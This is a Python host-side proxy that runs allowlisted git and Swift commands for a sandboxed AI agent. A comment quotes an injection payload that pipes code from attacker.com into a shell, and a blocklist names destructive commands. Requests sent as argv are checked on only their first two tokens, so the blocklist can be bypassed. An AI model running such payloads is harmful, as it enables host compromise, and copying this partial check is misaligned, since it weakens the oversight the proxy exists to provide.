#!/usr/bin/env python3
"""
Host proxy for Docker sandbox — runs on macOS host.
Receives command requests from the sandbox and executes only allowlisted commands.

Usage:
    python3 sandbox/host-proxy.py [--port PORT]
"""

import subprocess
import json
import argparse
import os
import re
import shlex
import sys
from typing import Optional, Tuple
from http.server import HTTPServer, BaseHTTPRequestHandler

# ── Security Model ───────────────────────────────────────────────────────────
# This proxy runs on the macOS HOST and executes commands that the sandboxed
# Docker agent cannot run itself (swift, codesign, git, bd).
#
# THREAT: A compromised sandbox could craft malicious payloads to execute
# arbitrary code on the host. The defenses are layered:
#
#   1. ALLOWLIST — only known-safe command prefixes are permitted.
#      Do NOT add shell scripts here. Scripts run inside the sandbox;
#      only atomic binaries go through this proxy.
#
#   2. DANGEROUS_CHARS — blocks shell metacharacters (;|&`$><) BEFORE
#      the allowlist check. This prevents injection even if an allowed
#      command's arguments contain payloads like $(rm -rf /) or `whoami`.
#      Do NOT remove this check or switch to shell=True.
#
#   3. BLOCKLIST — catches destructive patterns (force push, reset --hard)
#      that would pass the allowlist. Checked after dangerous chars.
#
#   4. shell=False — subprocess.run uses argv list, not a shell string.
#      The command is tokenized with shlex.split AFTER validation.
#      NEVER use shell=True here — it re-enables every injection vector.
#
#   5. CWD BOUNDARY — resolve_cwd() ensures commands only run within
#      the project root. Uses os.sep boundary check, not startswith(),
#      to prevent /project2 matching /project.
#
#   6. LOCALHOST ONLY — binds to 127.0.0.1, not 0.0.0.0. The sandbox
#      reaches us via Docker's host.docker.internal routing. Other
#      machines on the network cannot reach this proxy.
#
# When adding new commands to the allowlist:
#   - Add only the binary name + subcommand prefix, never scripts
#   - Check if the command accepts arguments that could be abused
#   - Add a blocklist pattern if the command has a destructive variant
# ─────────────────────────────────────────────────────────────────────────────

# ── Allowlist ────────────────────────────────────────────────────────────────
# Only atomic commands — NO scripts (sandbox could modify them before calling).
# Shims in the sandbox translate agent commands to these.

ALLOWED_EXACT = {
    "swift build",
    "swift test",
    "swift package resolve",
    "swift package clean",
    "swift --version",
    "git status",
    "git branch",
    "xcodebuild -version",
    # TRUST NOTE: this binary lives inside the workspace, which the sandbox can
    # write to. A hostile sandbox could replace it before the proxy executes it.
    # This is acceptable because the threat model is "trusted developer workflow",
    # not "untrusted agent". Do NOT use this pattern for hardened environments.
    ".build/debug/LingoLizardE2ETests",
}

# Prefix patterns: command must start with one of these
ALLOWED_PREFIXES = [
    # Swift toolchain
    "swift build ",
    "swift test ",
    "swift package ",
    # Codesign / Xcode
    "codesign ",
    "xcrun ",
    # Git (read + safe write operations)
    "git status ",
    "git diff",
    "git log",
    "git add ",
    "git commit ",
    "git checkout ",
    "git branch ",
    "git pull",
    "git push",
    "git merge ",
    "git tag ",
    "git stash",
    "git semver",
    "git worktree ",
    "git reset ",
    # Beads issue tracker
    "bd ",
]

# ── Blocklist (overrides allowlist) ──────────────────────────────────────────
# Checked AFTER dangerous chars but BEFORE allowlist. Uses \b word boundary
# so "push --force-with-lease" (safe) is NOT blocked, only "--force" exactly.
BLOCKED_PATTERNS = [
    re.compile(r"push\s+.*--force\b"),   # git push --force (destructive)
    re.compile(r"push\s+.*-f\b"),        # git push -f (short form)
    re.compile(r"reset\s+--hard"),       # git reset --hard (loses uncommitted work)
    re.compile(r"branch\s+-D\b"),        # git branch -D (force-delete, no merge check)
    re.compile(r"rm\s+-rf"),             # rm -rf (catastrophic if cwd check fails)
]

# SECURITY: Block shell metacharacters to prevent command injection.
# Without this, a command like `git commit -m "$(curl attacker.com | sh)"`
# would pass the "git commit " prefix check but execute arbitrary code
# when passed to a shell. This is the first line of defense — checked
# before allowlist/blocklist. Do NOT relax this pattern.
DANGEROUS_CHARS = re.compile(r"[;|&`$><\n]")

# ── Project root (allowed cwd boundary) ──────────────────────────────────────
PROJECT_ROOT = None  # Set via --project-root, defaults to cwd


def is_allowed(cmd: str) -> Tuple[bool, str]:
    """Check if a command is allowed by the allowlist and not blocked.

    Returns (allowed, reason) tuple.
    """
    cmd_stripped = cmd.strip()

    # Block shell metacharacters — prevents command injection via $(), ``, ;, |, etc.
    if DANGEROUS_CHARS.search(cmd_stripped):
        return False, "Shell metacharacters not allowed"

    # Check blocklist
    for pattern in BLOCKED_PATTERNS:
        if pattern.search(cmd_stripped):
            return False, "Matches blocklist pattern"

    # Check exact match
    if cmd_stripped in ALLOWED_EXACT:
        return True, ""

    # Check prefix match
    for prefix in ALLOWED_PREFIXES:
        if cmd_stripped.startswith(prefix):
            return True, ""

    return False, "Not in allowlist"


def resolve_cwd(requested_cwd: str) -> Optional[str]:
    """Resolve and validate cwd is within the project root.

    SECURITY: Uses os.sep boundary to prevent path traversal.
    Plain startswith("/path/to/project") would also match
    "/path/to/project-evil". The os.sep check ensures we only
    match the exact directory or its children.
    """
    if not requested_cwd:
        return PROJECT_ROOT

    # realpath follows symlinks — prevents symlink-based escapes
    resolved = os.path.realpath(requested_cwd)
    project_real = os.path.realpath(PROJECT_ROOT)

    if resolved == project_real or resolved.startswith(project_real + os.sep):
        return resolved

    return None


def sanitize_notification_field(value: str, max_length: int) -> str:
    cleaned = re.sub(r"[\x00-\x1f\x7f]+", " ", value or "")
    cleaned = cleaned.replace(";", ":").strip()
    return cleaned[:max_length]


def run_cmux_notify(payload: dict) -> subprocess.CompletedProcess:
    cmux_socket_path = payload.get("cmux_socket_path", "")
    if not isinstance(cmux_socket_path, str) or not cmux_socket_path.strip():
        raise ValueError("cmux_socket_path is required")

    title = sanitize_notification_field(str(payload.get("title", "Notification")), 120)
    subtitle = sanitize_notification_field(str(payload.get("subtitle", "")), 120)
    body = sanitize_notification_field(str(payload.get("body", "")), 600)

    argv = ["cmux", "notify"]
    workspace_id = payload.get("cmux_workspace_id", "")
    surface_id = payload.get("cmux_surface_id", "")
    if isinstance(workspace_id, str) and workspace_id.strip():
        argv.extend(["--workspace", workspace_id.strip()])
    if isinstance(surface_id, str) and surface_id.strip():
        argv.extend(["--surface", surface_id.strip()])
    argv.extend(["--title", title])
    if subtitle:
        argv.extend(["--subtitle", subtitle])
    if body:
        argv.extend(["--body", body])

    env = os.environ.copy()
    env["CMUX_SOCKET_PATH"] = cmux_socket_path.strip()
    env.pop("CMUX_WORKSPACE_ID", None)
    env.pop("CMUX_SURFACE_ID", None)
    env.pop("CMUX_TAB_ID", None)

    return subprocess.run(
        argv,
        capture_output=True,
        text=True,
        timeout=5,
        env=env,
    )


class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        """Health check endpoint."""
        self.send_response(200)
        self.end_headers()
        self.wfile.write(json.dumps({"status": "ok"}).encode())

    def do_POST(self):
        try:
            content_length = int(self.headers.get("Content-Length", 0))
            raw = self.rfile.read(content_length)
            print(f"[REQ] raw body: {raw[:500]}", flush=True)

            body = json.loads(raw)
            action = body.get("action", "")

            if action == "cmux_notify":
                result = run_cmux_notify(body)
                resp = json.dumps(
                    {
                        "exit_code": result.returncode,
                        "stdout": result.stdout[-10000:],
                        "stderr": result.stderr[-5000:],
                    }
                )
                self.send_response(200)
                self.end_headers()
                self.wfile.write(resp.encode())
                print(
                    f"[NOTIFY] exit={result.returncode} stdout={len(result.stdout)}B stderr={len(result.stderr)}B",
                    flush=True,
                )
                if result.returncode != 0 and result.stderr:
                    print(f"[NOTIFY STDERR] {result.stderr.rstrip()}", flush=True)
                return

            argv_list = body.get("argv")   # Preferred: pre-tokenized array
            cmd = body.get("cmd", "")      # Legacy: command string
            raw_cwd = body.get("cwd", "")

            if argv_list is not None:
                # Array format: reconstruct a minimal cmd string for allowlist
                # checking (first two tokens + trailing space covers all prefix
                # patterns). Arguments are passed as-is to subprocess — no shell
                # quoting or injection risk with shell=False.
                cmd_for_check = " ".join(argv_list[:2])
                if len(argv_list) > 2:
                    cmd_for_check += " "
                print(f"[REQ] argv={argv_list!r}  cwd={raw_cwd!r}", flush=True)
            else:
                cmd_for_check = cmd
                print(f"[REQ] cmd={cmd!r}  cwd={raw_cwd!r}", flush=True)

            allowed, reason = is_allowed(cmd_for_check)
            if not allowed:
                display = str(argv_list) if argv_list is not None else cmd
                self.send_response(403)
                self.end_headers()
                self.wfile.write(json.dumps({
                    "error": f"Blocked: {display}",
                    "reason": reason,
                    "hint": "Command not in allowlist. Edit sandbox/host-proxy.py to add it."
                }).encode())
                print(f"[BLOCKED] {display} ({reason})", flush=True)
                return

            cwd = resolve_cwd(raw_cwd)
            print(f"[CWD] requested={raw_cwd!r}  resolved={cwd!r}  project_root={PROJECT_ROOT!r}", flush=True)

            if cwd is None:
                self.send_response(403)
                self.end_headers()
                self.wfile.write(json.dumps({
                    "error": f"Blocked cwd: {raw_cwd}",
                    "hint": f"cwd must be within {PROJECT_ROOT}"
                }).encode())
                print(f"[BLOCKED CWD] {raw_cwd}", flush=True)
                return

            if argv_list is not None:
                # Array format: use directly — no shlex parsing needed, no
                # DANGEROUS_CHARS risk (shell=False passes args literally).
                argv = argv_list
            else:
                # Legacy string format: tokenize and validate metacharacters.
                # SECURITY: shlex.split tokenizes into argv list, then subprocess
                # runs WITHOUT a shell. Never use shell=True — it would let
                # metacharacters that somehow bypass DANGEROUS_CHARS still execute.
                argv = shlex.split(cmd)
            print(f"[EXEC] {argv}  (cwd: {cwd})", flush=True)

            result = subprocess.run(
                argv,
                shell=False,  # SECURITY: explicit — do NOT change to True
                capture_output=True,
                text=True,
                cwd=cwd,
                timeout=300,
            )
            stdout_truncated = len(result.stdout) > 10000
            stderr_truncated = len(result.stderr) > 5000
            resp = json.dumps({
                "exit_code": result.returncode,
                "stdout": result.stdout[-10000:],
                "stderr": result.stderr[-5000:],
                **({"stdout_truncated": True} if stdout_truncated else {}),
                **({"stderr_truncated": True} if stderr_truncated else {}),
            })
            print(f"[DONE] exit={result.returncode}  stdout={len(result.stdout)}B  stderr={len(result.stderr)}B", flush=True)
            self.send_response(200)
            self.end_headers()
            self.wfile.write(resp.encode())

        except json.JSONDecodeError as e:
            print(f"[ERROR] Bad JSON: {e}", flush=True)
            self.send_response(400)
            self.end_headers()
            self.wfile.write(json.dumps({"error": f"Bad JSON: {e}"}).encode())
        except subprocess.TimeoutExpired:
            print(f"[ERROR] Timeout after 300s", flush=True)
            self.send_response(504)
            self.end_headers()
            self.wfile.write(json.dumps({"error": "Command timed out after 300s"}).encode())
        except ValueError as e:
            print(f"[ERROR] Bad request: {e}", flush=True)
            self.send_response(400)
            self.end_headers()
            self.wfile.write(json.dumps({"error": str(e)}).encode())
        except Exception as e:
            print(f"[ERROR] {type(e).__name__}: {e}", flush=True)
            self.send_response(500)
            self.end_headers()
            self.wfile.write(json.dumps({"error": f"{type(e).__name__}: {e}"}).encode())

    def log_message(self, format, *args):
        # Enable default HTTP access log for debugging
        sys.stderr.write(f"  {self.address_string()} - {format % args}\n")


def main():
    parser = argparse.ArgumentParser(description="Host proxy for Docker sandbox")
    parser.add_argument("--port", type=int, default=9007, help="Port to listen on (default: 9007)")
    parser.add_argument("--project-root", type=str, default=".", help="Project root for command execution")
    args = parser.parse_args()

    global PROJECT_ROOT
    PROJECT_ROOT = args.project_root

    # SECURITY: Bind to localhost only. The sandbox reaches us via Docker's
    # host.docker.internal routing. Binding to 0.0.0.0 would expose command
    # execution to the entire network.
    server = HTTPServer(("127.0.0.1", args.port), Handler)
    print(f"Host proxy listening on 127.0.0.1:{args.port}")
    print(f"Project root: {PROJECT_ROOT}")
    print(f"Allowed commands: {len(ALLOWED_EXACT)} exact + {len(ALLOWED_PREFIXES)} prefixes")
    print("Press Ctrl+C to stop\n")

    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\nShutting down.")
        server.server_close()


if __name__ == "__main__":
    main()
